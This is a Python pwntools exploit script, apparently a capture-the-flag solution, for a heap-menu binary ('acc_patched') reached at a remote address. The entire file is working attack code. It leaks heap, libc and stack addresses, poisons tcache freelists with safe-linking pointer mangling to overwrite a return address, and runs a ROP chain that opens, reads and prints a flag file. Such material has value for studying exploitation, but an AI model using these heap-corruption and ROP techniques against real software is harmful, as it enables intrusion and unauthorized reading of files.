#!/usr/bin/env python3

from pwn import *

exe = ELF('acc_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda p, data: p.send(data)
sa = lambda p, msg, data: p.sendafter(msg, data)
sl = lambda p, data: p.sendline(data)
sla = lambda p, msg, data: p.sendlineafter(msg, data)
sn = lambda p, num: p.send(str(num).encode())
sna = lambda p, msg, num: p.sendafter(msg, str(num).encode())
sln = lambda p, num: p.sendline(str(num).encode())
slna = lambda p, msg, num: p.sendlineafter(msg, str(num).encode())
mangle = lambda val, adrs: \
	(adrs >> 12) ^ val
def get_pid(name):
    return int(check_output(["pgrep", "-f", "-n", name]))

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        brva 0x170D
        brva 0x176E
        brva 0x1BB4
        brva 0x1B04
        brva 0x1F32
        c
        ''')
        input()


if args.REMOTE:
    p = remote('65.109.199.182', 13373)
else:
    p = process([exe.path])

def register(username, size, payload):
    sla(p, b'> ', b'1')
    sla(p, b'username: ', username)
    sla(p, b': ', b'%d' % size)
    sa(p, b': ', payload.ljust(size, b'\x00'))

def view(idx):
    sla(p, b'> ', b'4')
    sla(p, b'index: ', b'%d' % idx)

def rename(idx, username):
    sla(p, b'> ', b'3')
    sla(p, b'dex: ', b'%d' % idx)
    sla(p, b'name: ', username)

def rebio(idx, bio):
    sla(p, b'> ', b'2')
    sla(p, b'dex: ', b'%d' % idx)
    sla(p, b'): ', bio)

def delete(idx):
    sla(p, b'> ', b'5')
    sla(p, b'index: ', b'%d' % idx)
#####################################################################################################
###################################### LEAK HEAP AND LEAK LIBC ######################################
#####################################################################################################
register(b'F', 0x1, b'B')     #0
register(b'F', 0xf8, b'A')    #1 
register(b'A', 0xf8, b'a')    #2
delete(1)
view(2)
p.recvuntil(b': ')
heap = (u64(p.recv(8).ljust(8, b'\x00')) << 12) - 0x1000
info('HEAP BASE: ' + hex(heap))
register(b'M', 0x828, b'B'*0x828)          #1
register(b'N', 0x828, b'B'*0x828)          #3
delete(1)
register(b'A', 0x1, b'B')                       #1
register(b'A', 0x420, b'BB')                    #4
register(b'C', 0x420, b'B'*0x420)               #5
delete(4)
view(5)
p.recvuntil (b': ')
libc.address = u64(p.recv(8).ljust(8, b'\x00')) - (libc.sym.main_arena + 96)
info('LIBC BASE: ' + hex(libc.address))
########################################################################################
###################################### LEAK STACK ######################################
########################################################################################
register(b'fff', 0x48, b'B')  #4
register(b'AAA', 0x1, b'B')   #6
register(b'AAA', 0x48, b'B')  #7
register(b'BBB', 0x48, b'CC') #8
delete(4)
delete(7)
rebio(8, p64(mangle(heap + 0x420, heap + 0xed0)).ljust(0x48, b'P'))
register(b'AAAA', 0x48, b'B')  #4
register(b'AAAA', 0x48, p64(heap >> 12) + p64(0x86ec9aba156b88f8) + p64(0)*3 + p64(0x48) + p64(libc.sym.environ) + p64(0x31) + p64(heap >> 12)) #7
view(6)
p.recvuntil(b': ')
stack_leak = u64(p.recvuntil(b'\x7f').ljust(8, b'\x00'))
info('LEAK STACK: ' + hex(stack_leak))
ret_addr = stack_leak - 0x138
info('RET_ADDR: ' + hex(ret_addr))
register(b'ggggg', 0x100, b'a') #9
register(b'aaaaa', 0x1, b'B')    #10
register(b'aaaaa', 0x100, b'B')   #11
register(b'BBBBB', 0x100, b'CC')  #12
delete(9)
delete(11)
rebio(12, p64(mangle(ret_addr, heap + 0x1760)).ljust(0x100, b'P'))
register(b'CCCCC', 0x100, b'fflag-2583a02920a04a40c8f817f5d7c2bff3')
pop_rax = 0xdd237 + libc.address
pop_rdi = 0x10f75b + libc.address
pop_rsi = 0x110a4d + libc.address
push_rdx = 0x4aa81 + libc.address
push_rax = 0x44365 + libc.address
movrdx_r13 = 0xb00d7 + libc.address
'''
0x00000000000b00d7 : mov rdx, r13 ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
0x000000000009d14c : mov rdx, r13 ; syscall
'''
rop = ROP(libc)
syscall = rop.find_gadget(['syscall', 'ret'])[0]
payload =  p64(0) + p64(pop_rax) + p64(0x2) + p64(pop_rdi) + p64(heap + 0x1761) + p64(pop_rsi) + p64(0) + p64(syscall)
payload += p64(pop_rdi) + p64(0x3) + p64(pop_rsi) + p64(heap + 0x1761) + p64(movrdx_r13) + p64(0)*2 + p64(0x200) + p64(0) + p64(movrdx_r13) + p64(0)*4 + p64(pop_rax) + p64(0x0) + p64(syscall)
#payload += p64(pop_rdi) + p64(0x3) + p64(pop_rsi) + p64(heap + 0x1761) + p64(movrdx_r13) + p64(0)*2 + p64(0x200) + p64(0) + p64(movrdx_r13) + p64(0)*4 + p64(pop_rax) + p64(0xd9) + p64(syscall)
payload += p64(pop_rax) + p64(0x1) + p64(pop_rdi) + p64(0x1) + p64(syscall)
register(b'DDDDE', 0x100, payload)
# GDB()

sla(p, b'> ', b'7') 
p.interactive()
